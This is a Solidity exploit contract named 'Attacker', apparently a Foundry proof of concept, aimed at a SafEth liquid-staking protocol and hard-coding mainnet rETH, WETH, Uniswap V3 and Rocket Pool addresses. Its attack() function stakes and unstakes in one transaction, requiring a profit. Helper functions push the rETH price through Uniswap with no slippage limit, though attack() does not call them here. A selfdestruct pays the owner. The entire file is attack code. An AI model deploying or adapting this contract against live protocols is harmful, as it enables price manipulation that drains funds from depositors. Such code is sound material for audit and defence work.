pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./interfaces/IWETH.sol";
import "./interfaces/uniswap/ISwapRouter.sol";
import "./interfaces/rocketpool/RocketDepositPoolInterface.sol";
import "./interfaces/rocketpool/RocketDAOProtocolSettingsDepositInterface.sol";

import "./SafEth/SafEth.sol";
import "forge-std/console.sol";

contract Attacker {
  IERC20 constant reth = IERC20(0xae78736Cd615f374D3085123A210448E74Fc6393);
  IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
  address constant UNISWAP_V3_ROUTER =
    0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
  SafEth immutable SAF_ETH;
  address immutable OWNER;
  RocketDepositPoolInterface constant rocketDepositPool =
    RocketDepositPoolInterface(0x2cac916b2A963Bf162f076C0a8a4a8200BCFBfb4);

  RocketDAOProtocolSettingsDepositInterface constant rocketDAOProtocolSettingsDeposit =
    RocketDAOProtocolSettingsDepositInterface(
      0xCc82C913B9f3a207b332d216B101970E39E59DB3
    );

  constructor(SafEth _safETH) {
    SAF_ETH = _safETH;
    OWNER = msg.sender;
  }

  function attack() public payable returns (uint256 balance) {
    SAF_ETH.stake{ value: msg.value }();
    SAF_ETH.unstake(SAF_ETH.balanceOf(address(this)));
    balance = address(this).balance;
    require(balance > msg.value, "!profitable");
  }

  function destroy() public {
    selfdestruct(payable(OWNER));
  }

  function _pumpRETH(uint256 _amount) internal {
    WETH.deposit{ value: _amount }();
    WETH.approve(UNISWAP_V3_ROUTER, _amount);
    ISwapRouter(UNISWAP_V3_ROUTER).exactInputSingle(
      ISwapRouter.ExactInputSingleParams({
        tokenIn: address(WETH),
        tokenOut: address(reth),
        fee: 500,
        recipient: address(this),
        amountIn: _amount,
        amountOutMinimum: 0,
        sqrtPriceLimitX96: 0
      })
    );
  }

  function _swapRETHBack() internal {
    uint256 balance = reth.balanceOf(address(this));
    reth.approve(UNISWAP_V3_ROUTER, balance);
    ISwapRouter(UNISWAP_V3_ROUTER).exactInputSingle(
      ISwapRouter.ExactInputSingleParams({
        tokenIn: address(reth),
        tokenOut: address(WETH),
        fee: 500,
        recipient: address(this),
        amountIn: balance,
        amountOutMinimum: 0,
        sqrtPriceLimitX96: 0
      })
    );
    WETH.withdraw(WETH.balanceOf(address(this)));
  }

  receive() external payable {}
}
